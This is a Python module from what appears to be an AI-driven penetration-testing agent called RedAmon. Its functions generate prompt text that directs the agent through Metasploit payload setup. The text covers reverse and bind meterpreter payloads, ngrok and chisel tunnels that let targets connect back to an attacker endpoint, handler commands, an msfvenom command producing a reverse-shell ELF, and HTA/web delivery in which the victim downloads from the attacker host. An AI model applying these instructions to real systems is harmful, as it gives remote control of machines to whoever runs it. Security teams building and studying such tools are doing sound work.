"""
RedAmon Agent Utility Functions

Utility functions for API and prompts that are not orchestrator-specific.
Orchestrator-specific helpers are in orchestrator_helpers/.
"""

import logging
from textwrap import dedent

from project_settings import get_setting

logger = logging.getLogger(__name__)


def get_session_count() -> int:
    """Get total number of active sessions."""
    from orchestrator_helpers import get_checkpointer
    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        return len(cp.storage)
    return 0


def _section(*paragraphs: str) -> list[str]:
    """Convert dedented text blocks into a flat list of lines with blank separators."""
    lines: list[str] = []
    for p in paragraphs:
        lines.extend(dedent(p).strip().splitlines())
        lines.append("")
    return lines


def get_session_config_prompt() -> str:
    """
    Generate a prompt section with pre-configured payload settings.

    Decision Logic (3-way):
        REVERSE: LHOST set AND LPORT set  → clear reverse intent
        BIND:    LHOST empty AND LPORT empty AND BIND_PORT set → clear bind intent
        ASK:     anything else (discordant or all empty) → agent must ask user

    When NGROK_TUNNEL_ENABLED is True, the agent queries the ngrok API to
    auto-discover the public tunnel URL, overriding LHOST and LPORT.

    When CHISEL_TUNNEL_ENABLED is True, LHOST is derived from
    CHISEL_SERVER_URL and ports are deterministic (4444 + 8080).

    Returns:
        Formatted string with Metasploit commands for the agent.
    """
    # Fetch settings: empty string / None = "not set"
    LHOST = get_setting('LHOST', '') or None
    LPORT = get_setting('LPORT')
    BIND_PORT_ON_TARGET = get_setting('BIND_PORT_ON_TARGET')
    PAYLOAD_USE_HTTPS = get_setting('PAYLOAD_USE_HTTPS', False)
    NGROK_TUNNEL_ENABLED = get_setting('NGROK_TUNNEL_ENABLED', False)
    CHISEL_TUNNEL_ENABLED = get_setting('CHISEL_TUNNEL_ENABLED', False)

    # -------------------------------------------------------------------------
    # NGROK TUNNEL: auto-discover public URL if enabled
    # -------------------------------------------------------------------------
    ngrok_active = False
    ngrok_error = None
    if NGROK_TUNNEL_ENABLED:
        tunnel_info = _query_ngrok_tunnel()
        if tunnel_info:
            LHOST = tunnel_info['host']
            LPORT = tunnel_info['port']
            ngrok_active = True
        else:
            ngrok_error = ("ngrok tunnel enabled but API unreachable "
                           "— falling back to configured LHOST/LPORT")

    # -------------------------------------------------------------------------
    # CHISEL TUNNEL: derive endpoints from CHISEL_SERVER_URL
    # -------------------------------------------------------------------------
    chisel_active = False
    chisel_error = None
    chisel_srv_port = None
    if CHISEL_TUNNEL_ENABLED and not ngrok_active:
        tunnel_info = _query_chisel_tunnel()
        if tunnel_info:
            LHOST = tunnel_info['host']
            LPORT = tunnel_info['port']
            chisel_srv_port = tunnel_info.get('srv_port')
            chisel_active = True
        else:
            chisel_error = ("chisel tunnel enabled but CHISEL_SERVER_URL not set or invalid "
                            "— falling back to configured LHOST/LPORT")

    # -------------------------------------------------------------------------
    # 3-WAY DECISION: reverse / bind / ask user
    # -------------------------------------------------------------------------
    has_lhost = bool(LHOST)
    has_lport = LPORT is not None and LPORT > 0
    has_bind_port = BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0

    if has_lhost and has_lport:
        mode = "reverse"
    elif not has_lhost and not has_lport and has_bind_port:
        mode = "bind"
    else:
        mode = "ask"

    lines: list[str] = ["### Pre-Configured Payload Settings", ""]

    # -------------------------------------------------------------------------
    # TUNNEL STATUS BANNERS
    # -------------------------------------------------------------------------
    if NGROK_TUNNEL_ENABLED:
        if ngrok_active:
            lines += _section(f"""\
                **ngrok Tunnel: ACTIVE** — public endpoint `{LHOST}:{LPORT}`
                The Metasploit listener runs locally on kali-sandbox:4444.
                The target connects to the ngrok public URL, which tunnels traffic to your listener.

                **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
                NEVER use bind payloads — bind mode cannot work through an ngrok tunnel
                because ngrok only forwards inbound connections to the local listener.**""")
        elif ngrok_error:
            lines += _section(f"**ngrok Tunnel: ERROR** — {ngrok_error}")

    if CHISEL_TUNNEL_ENABLED:
        if chisel_active:
            lines += _section(f"""\
                **Chisel Tunnel: ACTIVE** — handler `{LHOST}:{LPORT}` + web delivery `{LHOST}:{chisel_srv_port}`
                The Metasploit listener runs locally on kali-sandbox:4444.
                Web delivery / HTA server runs on kali-sandbox:8080.
                The target connects to the VPS public IP, which tunnels traffic through chisel.

                **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
                NEVER use bind payloads — bind mode cannot work through a chisel tunnel
                because chisel only forwards inbound connections to the local listener.**""")
        elif chisel_error:
            lines += _section(f"**Chisel Tunnel: ERROR** — {chisel_error}")

    # -------------------------------------------------------------------------
    # SHOW CONFIGURED MODE
    # -------------------------------------------------------------------------
    if mode == "reverse":
        # Determine connection type based on PAYLOAD_USE_HTTPS
        if PAYLOAD_USE_HTTPS:
            conn_type = "reverse_https"
            reason = "PAYLOAD_USE_HTTPS=True (encrypted, evades firewalls)"
        else:
            conn_type = "reverse_tcp"
            reason = "PAYLOAD_USE_HTTPS=False (fastest, plain TCP)"

        lines += _section(f"""\
            **Mode: REVERSE** (target connects to you)

            ```
            ┌─────────────┐                    ┌─────────────┐
            │   TARGET    │ ───connects to───► │  ATTACKER   │
            │             │                    │ {LHOST}:{LPORT} │
            └─────────────┘                    └─────────────┘
            ```

            **Payload type:** `{conn_type}` ({reason})

            **IMPORTANT: You MUST first set TARGET to Dropper/Staged!**
            ```
            show targets
            set TARGET 0   # Choose 'Automatic (Dropper)' or similar
            ```

            **Then select a Meterpreter reverse payload from `show payloads`:**

            Look for payloads with `meterpreter/{conn_type}` in the name.
            Choose the appropriate payload based on target platform:
            - `cmd/unix/*/meterpreter/{conn_type}` for interpreted languages (PHP, Python, etc.)
            - `linux/*/meterpreter/{conn_type}` for Linux native binaries
            - `windows/*/meterpreter/{conn_type}` for Windows targets""")

        if ngrok_active:
            lines += _section(f"""\
                **IMPORTANT: ngrok tunnel is active — REVERSE payloads ONLY!**

                **⚠️ STAGELESS PAYLOADS REQUIRED WITH NGROK!**
                Staged payloads (`meterpreter/reverse_tcp` with `/`) FAIL through ngrok —
                the stage transfer gets corrupted by the tunnel proxy and the session dies instantly.
                You MUST use **stageless** payloads (`meterpreter_reverse_tcp` with `_` underscore):

                | BROKEN (staged `/`) | USE THIS (stageless `_`) |
                |---------------------|--------------------------|
                | `linux/x64/meterpreter/{conn_type}` | `linux/x64/meterpreter_{conn_type}` |
                | `windows/meterpreter/{conn_type}` | `windows/meterpreter_{conn_type}` |
                | `cmd/unix/python/meterpreter/{conn_type}` | `python/meterpreter_{conn_type}` |

                There are TWO different LHOST/LPORT values — do NOT confuse them:

                | Purpose | LHOST | LPORT |
                |---------|-------|-------|
                | **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |
                | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
                | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |

                ngrok forwards `{LHOST}:{LPORT}` → `127.0.0.1:4444` inside kali-sandbox.

                **Metasploit handler commands (inside msfconsole):**
                ```
                set PAYLOAD <chosen_STAGELESS_reverse_payload>
                set LHOST {LHOST}
                set LPORT {LPORT}
                set ReverseListenerBindAddress 127.0.0.1
                set ReverseListenerBindPort 4444
                set AutoVerifySession false
                set DisablePayloadHandler false
                ```

                **For msfvenom standalone payloads:**
                `msfvenom -p linux/x64/meterpreter_{conn_type} LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`

                **For shell one-liners (NO-MODULE FALLBACK only):**
                Use `LHOST={LHOST}` and `LPORT={LPORT}` (the ngrok public endpoint).
                The handler MUST use the same LHOST/LPORT + ReverseListenerBindAddress settings above.""")

        elif chisel_active:
            lines += _section(f"""\
                **IMPORTANT: chisel tunnel is active — REVERSE payloads ONLY!**

                **⚠️ STAGELESS PAYLOADS REQUIRED WITH CHISEL!**
                Staged payloads (`meterpreter/reverse_tcp` with `/`) FAIL through chisel —
                the stage transfer gets corrupted by the tunnel and the session dies instantly in a loop.
                You MUST use **stageless** payloads (`meterpreter_reverse_tcp` with `_` underscore):

                | BROKEN (staged `/`) | USE THIS (stageless `_`) |
                |---------------------|--------------------------|
                | `linux/x64/meterpreter/{conn_type}` | `linux/x64/meterpreter_{conn_type}` |
                | `windows/meterpreter/{conn_type}` | `windows/meterpreter_{conn_type}` |
                | `python/meterpreter/{conn_type}` | `python/meterpreter_{conn_type}` |

                There are TWO different LHOST/LPORT contexts — do NOT confuse them:

                | Purpose | LHOST | LPORT |
                |---------|-------|-------|
                | **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |
                | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
                | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |
                | **Web delivery / HTA SRVHOST** (Metasploit module setting) | `0.0.0.0` | `8080` |
                | **Web delivery / HTA URL** (what the target downloads from) | `{LHOST}` | `{chisel_srv_port}` |

                chisel forwards `{LHOST}:{LPORT}` -> `127.0.0.1:4444` and `{LHOST}:{chisel_srv_port}` -> `127.0.0.1:8080` inside kali-sandbox.

                **Metasploit handler commands (inside msfconsole):**
                ```
                set PAYLOAD <chosen_STAGELESS_reverse_payload>
                set LHOST {LHOST}
                set LPORT {LPORT}
                set ReverseListenerBindAddress 127.0.0.1
                set ReverseListenerBindPort 4444
                set AutoVerifySession false
                set DisablePayloadHandler false
                ```

                **For web delivery / HTA delivery (Method C & D):**
                ```
                set SRVHOST 0.0.0.0
                set SRVPORT 8080
                ```
                The victim downloads from `http://{LHOST}:{chisel_srv_port}/...` which chisel tunnels to kali-sandbox:8080.

                **For msfvenom standalone payloads (STAGELESS only):**
                `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`

                **For shell one-liners (NO-MODULE FALLBACK only):**
                Use `LHOST={LHOST}` and `LPORT={LPORT}` (the VPS public endpoint).
                The handler MUST use the same LHOST/LPORT + ReverseListenerBindAddress settings above.""")

        else:
            lines += _section(f"""\
                **Metasploit commands:**
                ```
                set PAYLOAD <chosen_payload_from_show_payloads>
                set LHOST {LHOST}
                set LPORT {LPORT}
                ```""")

        lines += _section("After exploit succeeds, use `msf_wait_for_session()` to wait for session.")

    elif mode == "bind":
        lines += _section(f"""\
            **Mode: BIND** (you connect to target)

            ```
            ┌─────────────┐                    ┌─────────────┐
            │  ATTACKER   │ ───connects to───► │   TARGET    │
            │    (you)    │                    │ opens :{BIND_PORT_ON_TARGET} │
            └─────────────┘                    └─────────────┘
            ```

            **Then select a Meterpreter bind payload from `show payloads`:**

            Look for payloads with `meterpreter/bind_tcp` in the name.
            Choose the appropriate payload based on target platform:
            - `cmd/unix/*/meterpreter/bind_tcp` for interpreted languages (PHP, Python, etc.)
            - `linux/*/meterpreter/bind_tcp` for Linux native binaries
            - `windows/*/meterpreter/bind_tcp` for Windows targets

            **Metasploit commands:**
            ```
            set PAYLOAD <chosen_payload_from_show_payloads>
            set LPORT {BIND_PORT_ON_TARGET}
            ```

            **Note:** NO LHOST needed for bind payloads!
            After exploit succeeds, use `msf_wait_for_session()` to wait for connection.""")

    else:
        lines += _section(f"""\
            ⚠️ **PAYLOAD DIRECTION NOT CONFIGURED - ASK USER BEFORE EXPLOITING!**

            **Current settings:**
            - LHOST (Attacker IP): `{LHOST or 'empty'}`
            - LPORT (Attacker Port): `{LPORT or 'empty'}`
            - Bind Port on Target: `{BIND_PORT_ON_TARGET or 'empty'}`""")

        if NGROK_TUNNEL_ENABLED and ngrok_error:
            lines += _section("""\
                **Problem:** ngrok tunnel is enabled but the tunnel API is unreachable.
                The user intended to use a REVERSE payload through ngrok, but the tunnel is not running.
                Ask the user to check that the ngrok auth token is configured in Global Settings → Tunneling.""")
        elif CHISEL_TUNNEL_ENABLED and chisel_error:
            lines += _section("""\
                **Problem:** chisel tunnel is enabled but the chisel server URL is not set or invalid.
                The user intended to use a REVERSE payload through chisel, but the tunnel is not configured.
                Ask the user to check that the chisel server URL is configured in Global Settings → Tunneling.""")
        elif has_lhost and not has_lport:
            lines += _section("**Problem:** LHOST is set but LPORT is missing. For reverse payloads, both are required.")
        elif has_lport and not has_lhost:
            lines += _section("**Problem:** LPORT is set but LHOST is missing. For reverse payloads, both are required.")
        else:
            lines += _section("**Problem:** No payload direction is configured.")

        lines += _section("""\
            **Use `action: "ask_user"` to ask which payload mode to use:**

            1. **REVERSE** (target connects back to you):
               - Requires: LHOST (your IP) + LPORT (listening port)

            2. **BIND** (you connect to target):
               - Requires: Bind port on target (e.g. 4444)""")

    lines += _section("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")

    return "\n".join(lines)


def _query_ngrok_tunnel() -> dict | None:
    """
    Query the ngrok API to get the public TCP tunnel URL.

    ngrok runs inside kali-sandbox and exposes its API at
    http://kali-sandbox:4040/api/tunnels within the Docker network.

    The hostname is returned as-is (not pre-resolved) because the agent
    container's DNS may resolve ngrok TCP relay hostnames to a different
    IP than the actual relay server.  The target will resolve the hostname
    through its own DNS, which returns the correct IP.

    Returns:
        Dict with 'host' (str — ngrok hostname), 'port' (int), and
        'hostname' (str — same as host) if a TCP tunnel is found,
        or None if ngrok is unreachable or no tunnel exists.
    """
    import requests

    try:
        resp = requests.get("http://kali-sandbox:4040/api/tunnels", timeout=5)
        resp.raise_for_status()
        data = resp.json()

        for tunnel in data.get("tunnels", []):
            if tunnel.get("proto") == "tcp":
                public_url = tunnel["public_url"]  # e.g. "tcp://0.tcp.ngrok.io:12345"
                addr = public_url.replace("tcp://", "")
                hostname, port_str = addr.rsplit(":", 1)
                port = int(port_str)

                logger.info(f"ngrok TCP tunnel: {hostname}:{port}")
                return {
                    "host": hostname,
                    "port": port,
                    "hostname": hostname,
                }

        logger.warning("ngrok API returned no TCP tunnels")
        return None

    except Exception as e:
        logger.warning(f"Failed to query ngrok tunnel API: {e}")
        return None


def _query_chisel_tunnel() -> dict | None:
    """
    Derive public tunnel endpoints from the chisel server URL stored in the database.

    Unlike ngrok (which requires an API query to discover random ports),
    chisel tunnels are deterministic: the VPS hostname from the chisel server URL
    is the public endpoint, and the forwarded ports are always 4444 (handler)
    and 8080 (web delivery / HTA server).

    Returns:
        Dict with 'host' (str), 'port' (int = 4444), 'srv_port' (int = 8080),
        and 'hostname' (str) if chisel is configured,
        or None if not configured.
    """
    import os
    import requests as _requests
    from urllib.parse import urlparse

    # Fetch chisel URL from webapp (stored in UserSettings via Global Settings UI)
    webapp_url = os.environ.get("WEBAPP_API_URL", "http://webapp:3000")
    try:
        resp = _requests.get(
            f"{webapp_url}/api/global/tunnel-config",
            headers={"X-Internal-Key": os.environ.get("INTERNAL_API_KEY", "")},
            timeout=5,
        )
        resp.raise_for_status()
        chisel_url = resp.json().get("chiselServerUrl", "")
    except Exception as e:
        logger.warning(f"Failed to fetch chisel config from webapp: {e}")
        chisel_url = ""

    if not chisel_url:
        return None

    try:
        parsed = urlparse(chisel_url)
        hostname = parsed.hostname
        if not hostname:
            logger.warning(f"Cannot parse hostname from CHISEL_SERVER_URL: {chisel_url}")
            return None

        logger.info(f"chisel tunnel: {hostname}:4444 (handler) + {hostname}:8080 (web delivery)")
        return {
            "host": hostname,
            "port": 4444,
            "srv_port": 8080,
            "hostname": hostname,
        }
    except Exception as e:
        logger.warning(f"Failed to parse CHISEL_SERVER_URL: {e}")
        return None
